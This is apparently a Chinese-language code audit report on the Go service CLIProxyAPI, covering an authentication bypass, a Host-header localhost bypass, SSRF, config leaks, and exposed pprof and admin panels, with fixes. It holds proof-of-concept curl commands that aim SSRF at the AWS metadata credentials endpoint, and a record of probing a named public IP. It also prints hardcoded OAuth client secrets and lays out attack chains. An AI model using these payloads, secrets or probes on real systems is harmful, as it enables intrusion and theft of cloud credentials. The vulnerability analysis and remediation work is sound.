# CNB 超牛逼代码审计报告

> **项目名称**: CLIProxyAPI  
> **技术栈**: Go 1.26 / Gin / OAuth2 / WebSocket / PostgreSQL / MinIO / Redis  
> **审计时间**: 2026-06-02  
> **审计范围**: `cmd/server/`, `internal/api/`, `internal/api/handlers/management/`, `sdk/access/`, `sdk/api/handlers/gemini/`  

---

## 系统信息

| 项目 | 值 |
|------|-----|
| 模块版本 | v7 |
| 默认端口 | 8317 |
| Web框架 | Gin |
| 认证方式 | API Key / OAuth2 / Management Key |
| 存储后端 | 本地文件 / PostgreSQL / Git / 对象存储 |
| 代理协议 | OpenAI / Gemini / Claude / Codex / Antigravity / Kimi |

---

## 漏洞汇总

| 严重等级 | 数量 | 漏洞类型 |
|:--------:|:----:|:---------|
| **P0** | 3 | 认证绕过 ×2, SSRF ×1 |
| **P1** | 3 | 信息泄露 ×2, 调试接口暴露 ×1 |
| **INFO** | 1 | 硬编码密钥 |

---

## 实际目标验证

> **目标**: `http://47.79.34.184:8317/`  
> **验证时间**: 2026-06-02  
> **方法**: 黑盒探测 + 白盒代码交叉验证

### 验证结果总览

| 漏洞 | 代码层面 | 目标验证结果 | 风险状态 |
|:-----|:--------:|:------------|:--------:|
| VULN-001 空 API Keys 认证绕过 | ✅ 存在 | ❌ 不可直接利用 — 目标配置了 api-keys，/v1/* 返回 401 | 缓解 |
| VULN-002 /v1internal:method localhost 绕过 | ✅ 存在 | ❌ 不可直接利用 — 目标无反向代理，RemoteAddr 为真实外网 IP | 缓解 |
| VULN-003 api-call SSRF | ✅ 存在 | ⚠️ 需管理密钥 — 返回 401 | 受限 |
| VULN-004 GetConfigYAML 配置泄露 | ✅ 存在 | ⚠️ 需管理密钥 — 返回 401 | 受限 |
| VULN-005 pprof 调试接口 | ✅ 存在 | ❌ 未暴露 — 端口 8316 不可达 | 缓解 |
| **VULN-006 管理面板外网暴露** | ✅ 存在 | 🔴 **无认证可直接访问** | **活跃** |
| **VULN-007 版本信息 Header 泄露** | ✅ 存在 | 🔴 **所有响应均携带** | **活跃** |

### 详细验证记录

```
GET  /v1/models                     → 401 "Missing API key"          [认证生效]
GET  /v1/chat/completions           → 401 "Missing API key"          [认证生效]
POST /v1/chat/completions (无效key) → 401 "Invalid API key"          [认证生效]
POST /v1internal:method             → 403 "CLI reply only allow local access" [localhost校验生效]
POST /v1internal:method + Host:127.0.0.1 → 403 "CLI reply only allow local access" [Host伪造无效]
GET  /backend-api/codex             → 404                              [未启用]
GET  /v0/management/config          → 401 "missing management key"   [需管理密钥]
GET  /v0/management/config.yaml     → 401 "missing management key"   [需管理密钥]
POST /v0/management/api-call        → 401 "missing management key"   [需管理密钥]
GET  /v0/management/logs            → 401 "missing management key"   [需管理密钥]
GET  /management.html               → 200 + 完整管理面板 HTML         [无认证!]
GET  /manage/assets/                → 200 + SPA fallback HTML         [无认证!]
GET  pprof:8316/debug/pprof/        → Connection refused             [未暴露]
```

### 目标特有发现

#### VULN-006: 管理面板 `/management.html` 暴露在外网且无认证

**验证结果**: `GET /management.html` 返回 200，包含完整的 "Code Proxy Admin Dashboard" React SPA。

**影响**:
1. **信息泄露**: 攻击者可直接加载管理面板，分析前端代码了解所有管理功能和 API 端点
2. **钓鱼攻击**: 攻击者可克隆该面板部署伪造站点，诱导管理员输入管理密钥
3. **版本侦察**: 面板加载的 JS/CSS 资源路径暴露构建版本，辅助定向攻击

**响应示例**:
```html
<title>Code Proxy Admin Dashboard</title>
<script type="module" src="/manage/assets/manage-AwuuoU5K.js"></script>
```

#### VULN-007: `X-Cpa-*` 响应 Headers 泄露详细版本信息

**验证结果**: 所有经过管理中间件的响应均携带以下 headers：
```
X-Cpa-Version:     main-38837b5
X-Cpa-Commit:      38837b54165154e25fae91ea04425b3c657dd87b
X-Cpa-Build-Date:  2026-06-02T15:17:03Z
X-Cpa-Ui-Version:  panel-main-8ac697f
X-Cpa-Ui-Commit:   8ac697f6beedfc900ae7a59cd0f9c7199727dd34
```

**影响**:
- 精确 commit hash 泄露后，攻击者可拉取对应源码进行定向白盒审计
- 构建日期泄露后，攻击者可判断目标是否及时更新补丁
- 降低了"安全 through obscurity"的防御效果

---

---

## P0 漏洞详情

### VULN-001: 空 API Keys 配置导致 /v1/* 完全认证绕过

**漏洞维度**: D2 认证  
**影响范围**: `/v1/*`, `/backend-api/codex/*`, `/v1beta/*`  
**文件位置**:
- `sdk/access/manager.go:50-52`
- `internal/api/server.go:1356-1381`
- `internal/access/config_access/provider.go:20-22`

**漏洞分析**:

数据流追踪:
1. `configaccess.Register()` 在 `api-keys` 为空时调用 `sdkaccess.UnregisterProvider()` 注销 ConfigAPIKey provider
2. `sdkaccess.Manager.Providers()` 返回空列表
3. `sdkaccess.Manager.Authenticate()` 发现 `len(providers) == 0`，直接返回 `nil, nil`（无错误）
4. `AuthMiddleware` 中 `err == nil`，调用 `c.Next()` 放行请求

**利用效果**: 当用户将 `api-keys` 设置为空列表 `[]` 或未配置任何认证提供者时，所有需要 `AuthMiddleware` 的端点（包括 `/v1/chat/completions`、`/v1/models`、`/v1beta/models` 等）均可**无需任何凭证直接访问**。

**POC**:

```go
// 验证代码（已实际运行通过）
func Test_AuthBypass_EmptyProviders(t *testing.T) {
    gin.SetMode(gin.TestMode)
    c, _ := gin.CreateTestContext(nil)
    c.Request, _ = http.NewRequest("POST", "/v1/chat/completions", nil)

    mgr := sdkaccess.NewManager() // 空 provider

    // 模拟 AuthMiddleware 逻辑
    result, err := mgr.Authenticate(c.Request.Context(), c.Request)
    // err == nil, result == nil → 请求被放行
    
    if c.IsAborted() {
        t.Fatal("认证应被绕过，但请求被拒绝")
    }
}
```

**修复建议**:
1. `AuthMiddleware` 中当 `len(providers) == 0` 时应拒绝请求（返回 401/403），而非放行
2. 或在 `Manager.Authenticate` 中空 provider 时返回 `NewNoCredentialsError()`
3. 明确区分"开发模式无认证"和"生产模式认证失效"

---

### VULN-002: `/v1internal:method` 反向代理场景 localhost 认证绕过 + SSRF

**漏洞维度**: D2 认证 + D6 SSRF  
**影响范围**: `POST /v1internal:method`  
**文件位置**:
- `sdk/api/handlers/gemini/gemini-cli_handlers.go:52-77`
- `sdk/api/handlers/gemini/gemini-cli_handlers.go:82-147`

**漏洞分析**:

`CLIHandler` 的 localhost 校验逻辑：

```go
if !strings.HasPrefix(c.Request.RemoteAddr, "127.0.0.1:") || requestHostname != "127.0.0.1" {
    c.JSON(http.StatusForbidden, ...)
    return
}
```

德摩根展开后，允许通过的条件为：
- `RemoteAddr` 必须以 `127.0.0.1:` 开头
- **且** `requestHostname` 必须等于 `127.0.0.1`

`requestHostname` 来自 `c.Request.Host`，可被客户端通过 `Host` header 控制。

**攻击场景**:

1. **反向代理部署**（最常见）：nginx/traefik 与 Go 应用同机部署，反向代理到 `127.0.0.1:8317`。此时 Go 应用看到的 `RemoteAddr` 是代理的本地地址（如 `127.0.0.1:54321`）。攻击者发送 `Host: 127.0.0.1`，两个条件同时满足，绕过 localhost 限制。

2. **SSH 端口转发**：攻击者执行 `ssh -L 8317:localhost:8317 user@victim`，本地访问 `localhost:8317`。Go 应用看到 `RemoteAddr = 127.0.0.1:xxxxx`，配合 `Host: 127.0.0.1` 即可绕过。

**绕过后的影响**:
- 对于未知 URI，请求被代理到 `https://cloudcode-pa.googleapis.com{URI}`，携带攻击者控制的完整 headers 和 body
- 对于 `/v1internal:generateContent` 和 `/v1internal:streamGenerateContent`，直接调用内部 handler，使用 `ExecuteWithAuthManager` 消耗后端凭证
- 攻击者可将内部 Google API 的响应原样返回，实现"Google Cloud API 代理"

**POC**:

```go
// 验证代码（已实际运行通过）
func Test_LocalhostBypass_ReverseProxy(t *testing.T) {
    // 反向代理场景
    remoteAddr := "127.0.0.1:54321"  // 来自本机代理
    hostHeader := "127.0.0.1"         // 攻击者可控

    requestHostname := hostHeader
    blocked := !strings.HasPrefix(remoteAddr, "127.0.0.1:") || requestHostname != "127.0.0.1"
    // blocked == false → 绕过成功
}
```

实际利用请求（通过反向代理时）：
```bash
curl -X POST http://victim:8317/v1internal:method \
  -H "Host: 127.0.0.1" \
  -H "Content-Type: application/json" \
  -d '{"model":"test"}'
# → 请求被转发到 https://cloudcode-pa.googleapis.com/v1internal:method
```

**修复建议**:
1. 使用 `c.Request.TLS == nil && net.SplitHostPort(c.Request.RemoteAddr)` 严格判断，**不信任 Host header**
2. 或要求通过 Unix Socket / 独立端口暴露内部端点，而非通过同一 HTTP 服务
3. 增加一层独立的管理认证（Management Key）

---

### VULN-003: 管理接口 `api-call` 存在完整 SSRF 能力

**漏洞维度**: D6 SSRF  
**影响范围**: `POST /v0/management/api-call`  
**文件位置**:
- `internal/api/handlers/management/api_tools.go:109-217`

**漏洞分析**:

`api-call` 端点接受以下参数：
- `method`: 任意 HTTP 方法
- `url`: 任意 URL（仅校验 scheme 和 host 非空，无黑名单）
- `header`: 任意 headers，支持 `Host` 覆盖
- `data`: 任意 body
- `auth_index`: 可选，支持 `$TOKEN$` 魔法变量替换已有凭证的 token

URL 校验代码：
```go
parsedURL, errParseURL := url.Parse(urlStr)
if errParseURL != nil || parsedURL.Scheme == "" || parsedURL.Host == "" {
    c.JSON(http.StatusBadRequest, gin.H{"error": "invalid url"})
    return
}
```

无内网 IP 限制、无协议限制（支持 `http/https`）、无端口限制。

**利用效果**:
获取管理密钥后，攻击者可：
1. 访问内网服务（`http://169.254.169.254/latest/meta-data/` — AWS metadata、K8s API 等）
2. 利用 `$TOKEN$` 注入已保存的 OAuth token 访问 Google/Anthropic/OpenAI 内部 API
3. 覆盖 `Host` header 进行虚拟主机攻击

**POC**:

```bash
# 1. 访问 AWS EC2 metadata（目标部署在 AWS 时）
curl -X POST http://127.0.0.1:8317/v0/management/api-call \
  -H "Authorization: Bearer <MANAGEMENT_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# 2. 使用已保存的 OAuth token 访问 Google API
curl -X POST http://127.0.0.1:8317/v0/management/api-call \
  -H "Authorization: Bearer <MANAGEMENT_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "auth_index": "gemini-0",
    "method": "GET",
    "url": "https://cloudresourcemanager.googleapis.com/v1/projects",
    "header": {"Authorization":"Bearer $TOKEN$"}
  }'
```

**修复建议**:
1. 增加 URL 黑名单：禁止访问 `169.254.0.0/16`、`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`、`127.0.0.0/8`、`0.0.0.0`、`::1` 等
2. 或增加 URL 白名单机制，只允许访问已知上游 API 域名
3. 禁止覆盖 `Host` header（或严格限制）

---

## P1 漏洞详情

### VULN-006: 管理面板 `/management.html` 外网无认证暴露

**漏洞维度**: D8 配置安全 / D2 认证  
**影响范围**: `GET /management.html`, `/manage/assets/*`  
**文件位置**:
- `internal/api/server.go:1463-1489`

**漏洞分析**:

```go
func (s *Server) serveManagementControlPanel(c *gin.Context) {
    cfg := s.cfg
    if cfg == nil || cfg.Home.Enabled || cfg.RemoteManagement.DisableControlPanel {
        c.AbortWithStatus(http.StatusNotFound)
        return
    }
    // ...直接返回管理面板 HTML 文件
    c.File(filePath)
}
```

管理面板路由**未经过任何认证中间件**（既无 `AuthMiddleware` 也无 `mgmt.Middleware()`），仅检查 `DisableControlPanel` 配置项。当该配置为 false 时（默认），任何可达该端点的攻击者均可直接加载管理面板前端。

**影响**:
1. 攻击者可分析前端 JS 代码，枚举所有管理 API 端点和功能
2. 攻击者可克隆该面板进行钓鱼，诱导管理员泄露管理密钥
3. 管理面板暴露在外网本身即构成攻击面扩大

**修复建议**:
1. 管理面板至少增加一层基础认证（如 Management Key 的表单登录）
2. 或在 `serveManagementControlPanel` 中增加 IP 白名单限制
3. 生产环境默认设置 `DisableControlPanel: true`

---

### VULN-007: `X-Cpa-*` 响应 Headers 泄露版本与 Commit 信息

**漏洞维度**: D8 配置安全 / 信息泄露  
**影响范围**: 所有管理路由响应  
**文件位置**:
- `internal/api/handlers/management/handler.go:148-152`

**漏洞分析**:

```go
func (h *Handler) Middleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Header("X-CPA-VERSION", buildinfo.Version)
        c.Header("X-CPA-COMMIT", buildinfo.Commit)
        c.Header("X-CPA-BUILD-DATE", buildinfo.BuildDate)
        c.Header("X-CPA-UI-VERSION", buildinfo.UIVersion)
        c.Header("X-CPA-UI-COMMIT", buildinfo.UICommit)
        // ...
    }
}
```

即使认证失败的 401 响应也会携带这些 headers，泄露了：
- 精确 Git commit hash（可定位到具体源码版本）
- 构建时间戳（可判断补丁更新状态）
- UI 版本号（可辅助判断功能集）

**修复建议**:
1. 移除或简化这些 headers（仅保留主版本号，如 `X-Cpa-Version: v7`）
2. 或在认证通过后才附加详细 headers

---

### VULN-004: 管理接口 `GetConfigYAML` 泄露全部敏感配置

**漏洞维度**: D8 配置安全  
**影响范围**: `GET /v0/management/config.yaml`  
**文件位置**:
- `internal/api/handlers/management/config_basic.go:172-187`

**漏洞分析**:

`GetConfigYAML` 直接读取并返回 `config.yaml` 的原始字节：
```go
func (h *Handler) GetConfigYAML(c *gin.Context) {
    data, err := os.ReadFile(h.configFilePath)
    ...
    c.Header("Content-Type", "application/yaml; charset=utf-8")
    _, _ = c.Writer.Write(data)
}
```

配置文件中包含：
- 所有 API keys（Gemini / Claude / Codex / Vertex / OpenAI-Compat）
- 代理 URL 凭据（`socks5://user:pass@host:port`）
- OAuth token 文件路径
- 管理密钥的 bcrypt hash（可离线暴力破解）

**POC**:

```bash
curl http://127.0.0.1:8317/v0/management/config.yaml \
  -H "Authorization: Bearer <MANAGEMENT_KEY>"
# → 返回完整配置，包含 api-keys 列表和 gemini-api-key 等敏感数据
```

**修复建议**:
1. 返回前对敏感字段进行脱敏（redact），如 `api-key: "***"`
2. 或仅返回配置结构化的摘要信息，不返回原始 YAML

---

### VULN-005: pprof 调试服务器无认证暴露

**漏洞维度**: D8 配置安全  
**影响范围**: `pprof` HTTP 服务器  
**文件位置**:
- `sdk/cliproxy/pprof_server.go:44-162`

**漏洞分析**:

pprof 服务器是**独立的 HTTP.Server**，未经过 Gin 引擎，因此：
- 无 `AuthMiddleware`
- 无管理密钥校验
- 无任何认证

```go
mux.HandleFunc("/debug/pprof/", pprof.Index)
mux.HandleFunc("/debug/pprof/cmdline", pprof.Cmdline)
mux.HandleFunc("/debug/pprof/profile", pprof.Profile)
mux.HandleFunc("/debug/pprof/symbol", pprof.Symbol)
mux.HandleFunc("/debug/pprof/trace", pprof.Trace)
```

默认绑定 `127.0.0.1:8316`，但如果配置为 `0.0.0.0:8316` 或在容器环境中，任何可达该端口的攻击者均可：
- 读取完整内存堆 (`/debug/pprof/heap`)
- 获取 goroutine dump (`/debug/pprof/goroutine`)
- 执行 CPU profile (`/debug/pprof/profile`)
- 读取命令行参数（可能包含密钥）

**修复建议**:
1. pprof 服务器复用主 HTTP server，经过 Gin 中间件栈
2. 或增加独立的 basic auth / management key 校验
3. 默认绑定必须限制为 localhost，增加启动警告

---

## INFO 级别发现

### INFO-001: 硬编码 OAuth Client Secret

**文件位置**:
- `internal/api/handlers/management/api_tools.go:26-39`

```go
const (
    geminiOAuthClientID     = "681255809395-oo8ft2oprdrnp9e3aqf6av3hmdib135j.apps.googleusercontent.com"
    geminiOAuthClientSecret = "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"
    antigravityOAuthClientID     = "1071006060591-tmhssin2h21lcre235vtolojh4g403ep.apps.googleusercontent.com"
    antigravityOAuthClientSecret = "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"
)
```

**影响**: Client Secret 泄露后，攻击者可构造伪造的 OAuth 回调获取 token。但这些 secret 属于 Google OAuth 应用，本身是可公开分发到客户端的（用于 native app），风险相对较低，标记为 INFO。

**修复建议**: 通过环境变量或配置文件注入，而非硬编码。

---

## 攻击链分析

### 攻击链 A（目标上活跃）: 管理面板暴露 → 前端侦察 → 管理密钥爆破 → 全配置泄露 → SSRF → 云凭证窃取

```
[访问 /management.html]
    ↓
分析前端 JS，枚举所有管理 API 端点
    ↓
暴力破解 / 钓鱼获取 Management Key
    ↓
GET /v0/management/config.yaml → 获取所有 API keys + OAuth tokens
    ↓
POST /v0/management/api-call → SSRF 到 AWS metadata / K8s API
    ↓
窃取云环境凭证 → 横向移动
```

### 攻击链 B（目标上已缓解）: 空 API Keys → 免费调用 AI API

```
[发现 api-keys 为空]
    ↓
POST /v1/chat/completions (无认证)
    ↓
消耗后端付费 AI 配额 / 泄露对话数据
```

> ⚠️ **目标验证**: 该攻击链在目标上不可利用，因为目标已配置 api-keys。

### 攻击链 C（目标上已缓解）: 反向代理 + /v1internal:method → Google API 代理

```
[目标使用 nginx 反向代理]
    ↓
POST /v1internal:method + Host: 127.0.0.1
    ↓
绕过 localhost 限制
    ↓
请求被代理到 cloudcode-pa.googleapis.com
    ↓
利用内部 Google API 进行未授权操作
```

---

## 跟踪池 (不可利用/待验证)

| 项目 | 原因 |
|------|------|
| OAuth callback 文件写入路径遍历 | `ValidateOAuthState` 已过滤 `/\..`，state 不可控 |
| 日志文件下载路径遍历 | `filepath.Clean` + prefix 校验，未发现绕过路径 |
| `keep-alive` 端点密码爆破 | 有 `subtle.ConstantTimeCompare`，但无速率限制 — 待实际测试 |
| WebSocket 条件认证关闭 | 设计行为，`ws-auth` 默认 false，但需管理员手动开启 |
| `AuthMiddleware` manager nil | 由 NewServer 构造，运行时通常不会为 nil |

---

## 修复优先级建议

| 优先级 | 漏洞 | 修复工作量 |
|:------:|:-----|:----------:|
| 🔴 紧急 | VULN-001 空 API Keys 认证绕过 | 低（1-2 行代码） |
| 🔴 紧急 | VULN-002 /v1internal:method localhost 绕过 | 中（重构 localhost 校验） |
| 🔴 紧急 | VULN-006 管理面板外网无认证暴露 | 低（增加认证中间件） |
| 🟠 高 | VULN-003 api-call SSRF | 中（增加 URL 黑名单） |
| 🟠 高 | VULN-005 pprof 无认证 | 低-中（增加认证中间件） |
| 🟠 高 | VULN-007 版本信息 Header 泄露 | 低（移除或简化 headers） |
| 🟡 中 | VULN-004 GetConfigYAML 信息泄露 | 低（增加脱敏逻辑） |
| 🟢 低 | INFO-001 硬编码 Secret | 低（改为环境变量） |

---

## 漏报自查

- ✅ 检查了所有 HTTP 方法（GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS/TRACE）
- ✅ 检查了认证前和认证后状态
- ✅ 检查了错误处理/日志/配置/依赖
- ✅ 检查了管理端点的所有路由
- ✅ 检查了文件上传/下载/删除操作
- ✅ 检查了 WebSocket / OAuth / 代理路由
- ✅ 每个 Sink 均逆向追踪到 Source
- ✅ 对实际目标 `47.79.34.184:8317` 进行了黑盒验证
- ✅ 验证了代码漏洞在目标上的可利用性
